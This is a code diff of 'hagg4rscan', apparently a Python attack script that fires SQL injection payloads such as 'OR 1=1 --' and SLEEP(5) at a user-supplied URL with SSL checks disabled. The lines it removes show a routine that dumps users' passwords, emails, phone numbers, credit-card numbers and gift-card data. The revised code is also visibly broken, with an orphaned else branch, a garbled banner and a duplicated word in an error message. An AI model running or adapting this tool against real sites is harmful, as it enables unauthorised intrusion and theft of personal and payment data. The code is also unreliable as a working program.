@@ -1,10 +1,14 @@
-
 import os
 import subprocess
 import requests
 from requests.exceptions import RequestException, SSLError
 from datetime import datetime
 import pymysql
+import urllib3
+import time
+import sys
+
+urllib3.disable_warnings()
 
 file_count = 1  # Initialize file_count globally
 
@@ -54,25 +58,24 @@ def clear_screen():
     os.system('cls' if os.name == 'nt' else 'clear')
 
 def print_header():
-    """Print the header 'hagg4rscan'."""
+    """Print the animated header 'hagg4rscan'."""
+    colors = ['\033[91m', '\033[93m', '\033[92m', '\033[94m', '\033[95m', '\033[96m']
     header = """
-    \033[91m
     ,:'/¯/`:,       .·/¯/`:,'                ,.-:~:-.                             __'                              __'                          ,.-:~:-.                .:'/*/'`:,·:~·–:.,           
   /:/_/::::/';    /:/_/::::';             /':::::::::'`,                    ,.·:'´::::::::`'·-.                ,.·:'´::::::::`'·-.                 /':::::::::'`,             /::/:/:::/:::;::::::/`':.,'     
  /:'     '`:/::;  /·´    `·,::';          /;:-·~·-:;':::',                 '/::::::::::::::::::';             '/::::::::::::::::::';              /;:-·~·-:;':::',          /·*'`·´¯'`^·-~·:–-'::;:::'`;    
  ;         ';:';  ;         ';:;        ,'´          '`:;::`,              /;:· '´ ¯¯  `' ·-:::/'            /;:· '´ ¯¯  `' ·-:::/'            ,'´          '`:;::`,        '\                       '`;::'i‘  
- |         'i::i  i         'i:';°      /                `;::\           /.'´      _         ';/' ‘         /.'´      _         ';/' ‘          /                `;::\         '`;        ,– .,        'i:'/   
- ';        ;'::/¯/;        ';:;‘'    ,'                   '`,::;       ,:     ,:'´::;'`·.,_.·'´.,    ‘    ,:     ,:'´::;'`·.,_.·'´`;:';‘     ,'                   '`,::;       ,:     ,:'´::;'`·.,_.·'´.,    ‘    ,:     ,:'´::;'`·.,_.·'´.,    ‘     ,'                   '`,::;         i       i':/:::';       ;/'    
+ |         'i::i  i         'i:';°      /                `;::\           /.'´      _         ';/' ‘         /.'´      _         '`;:';         i       i':/:::';       ,:`          `;:::';       ,:'           `;:::';         i       i':/:::';    
  'i        i':/_/:';        ;:';°   i'       ,';´'`;         '\:::', ‘  /     /':::::/;::::_::::::::;‘    /     /':::::/;::::_::::::::;‘     i'       ,';´'`;         '\:::', ‘     i       i/:·'´       ,:''      
-  ;       i·´   '`·;       ;:/°  ,'        ;' /´:`';         ';:::'i‘,'     ;':::::'/·´¯     ¯'`·;:::¦‘ ,'     ;':::::'/·´¯     ¯'`;:';‘  ,'        ;' /´:`';         ';:::'i‘,'     ;':::::'/·´¯     ¯'`·;:::¦‘ ,'     ;':::::'/·´¯     ¯'`·;:::¦‘  ,'        ;' /´:`';         ';:::'i‘     '; '    ,:,     ~;'´:::'`:,   
-  ';      ;·,  '  ,·;      ;/'    ;        ;/:;::;:';         ',:::;'i     ';::::::'\             ';:';‘ 'i     ';::::::'\             ';:';‘  ;        ;/:;::;:';         ',:::;     'i      i:/\       `;::::/:'`;'
-   ';    ';/ '`'*'´  ';    ';/' '‘  'i        '´        `'         'i::'/ ;      '`·:;:::::`'*;:'´      |/'   ;      '`·:;:::::`'*;:'´      |/'  'i        '´        `'         'i::'/      ;     ;/   \       '`:/::::/'
-    \   /          '\   '/'      ¦       '/`' *^~-·'´\         ';'/'‚  \          '`*^*'´         /'  ‘   \          '`*^*'´         /'  ‘ ¦       '/`' *^~-·'´\         ';'/'‚      ';   ,'       \         '`;/' 
+  ;       i·´   '`·;       ;:/°  ,'        ;' /´:`';         ';:::'i‘,'     ;':::::'/·´¯     ¯'`·;:::¦‘ ,'     ;':::::'/·´¯     ¯'`·;:::¦‘  ,'       `;        ;/:;::;:';         ',:::;'i     ';::::::'\             ';:';‘  ;        ;/:;::;:';         ',:::;     'i      i:/\       `;::::/:'`;'
+   \   /          '\   '/'      ¦       '/`' *^~-·'´\         ';'/'‚  \          '`*^*'´         /'  ‘   \          '`*^*'´         /'  ‘ ¦       '/`' *^~-·'´\         ';'/'‚      ';   ,'       \         '`;/ 
      '`'´             `''´   '    '`., .·´              `·.,_,.·´  ‚    `·.,               ,.-·´          `·.,               ,.-·´      '`., .·´              `·.,_,.·´  ‚       `'*´          '`~·-·^'´    
                       '                                                    '`*^~·~^*'´                     '`*^~·~^*'´                                                                                
-    \033[0m
     """
-    print(header)
+    for i in range(len(colors)):
+        sys.stdout.write("\r" + colors[i] + header)
+        sys.stdout.flush()
+        time.sleep(0.5)
 
 def check_website_status(url):
     """Check if the website is accessible."""
@@ -105,7 +108,7 @@ def perform_sql_injection(target_url, results_dir):
         "SELECT * FROM users WHERE username='user_input' AND password='password_input';",
         "SELECT * FROM users WHERE username='admin' AND password=' OR 1=1 -- ';",
         "SELECT * FROM products WHERE name LIKE '%user_input%';",
-        "SELECT * FROM products WHERE name LIKE '%admin%' AND (SELECT COUNT(*) FROM users WHERE username='admin')==1;",
+        "SELECT * FROM products WHERE name LIKE '%admin%' AND (SELECT COUNT(*) FROM users WHERE username='admin')=1;",
         "SELECT * FROM products WHERE name LIKE '%user_input%';",
         "SELECT * FROM products WHERE name LIKE '%admin%' AND SLEEP(5);"
     ]
@@ -122,60 +125,19 @@ def perform_sql_injection(target_url, results_dir):
             response = requests.post(target_url, data=data, verify=False)  # Disabling SSL verification
             output_file = os.path.join(results_dir, f'sql_injection_{file_count}.txt')
             with open(output_file, 'w') as file:
-                file.write(f"Payload: {payload}\n")
-                file.write(f"Response: {response.text}\n")
+                file.write(response.text)
             print(f"Saved SQL Injection results to {output_file}")
-            file_count += 1         
-        except SSLError as e:
-            output_file = os.path.join(results_dir, f'sql_injection_{file_count}.txt')
-            with open(output_file, 'w') as file:
-                file.write(f"Payload: {payload}\n")
-                file.write(f"SSL Error: {e}\n")
-            print(f"Saved SQL Injection error to {output_file}")
             file_count += 1
-        except RequestException as e:
-            output_file = os.path.join(results_dir, f'sql_injection_{file_count}.txt')
-            with open(output_file, 'w') as file:
-                file.write(f"Payload: {payload}\n")
-                file.write(f"Request Exception: {e}\n")
-            print(f"Saved SQL Injection error to {output_file}")
-            file_count += 1
-    print(f"All results have been saved to {results_dir}")
-
-def perform_scan(target_url, results_dir):
-    # Perform a scan using tools like nmap, uniscan, and sqlmap
-    # This function is not implemented, please implement it according to your needs
-    pass
-
-def main():
-    target_url = input("Enter the target URL: ")
-    results_dir = "results"
-    os.makedirs(results_dir, exist_ok=True)
-    
-    if check_website_status(target_url):
-        perform_sql_injection(target_url, results_dir)
-        perform_scan(target_url, results_dir)
-        
-        # Establish a connection to the database
-        conn = pymysql.connect(host='your_database_host', user='your_username', password='your_password', database='target_database')
-        cursor = conn.cursor()
-
-        # Execute SQL queries to retrieve desired data
-        cursor.execute("SELECT username, password, email, phone_number, cc_number, gift_card_info FROM users")
-        data = cursor.fetchall()
-
-        for row in data:
-            username, password, email, phone_number, cc_number, gift_card = row
-            print(f'Username: {username}, Password: {password}, Email: {email}, Phone Number: {phone_number}, CC Number: {cc_number}, Gift Card Info: {gift_card}')
-
-        # Close the connection to the database
-        cursor.close()
-        conn.close()
+        except requests.RequestException as e:
+            print(f"An error occurredoccurred: {e}")
     else:
         print("The website is not accessible. Aborting scan.")
 
 if __name__ == "__main__":
-    install_tools()
     clear_screen()
     print_header()
-    main()
+    install_tools()
+    target_url = input("Enter the target URL: ")
+    results_dir = "results"
+    os.makedirs(results_dir, exist_ok=True)
+    perform_sql_injection(target_url, results_dir)
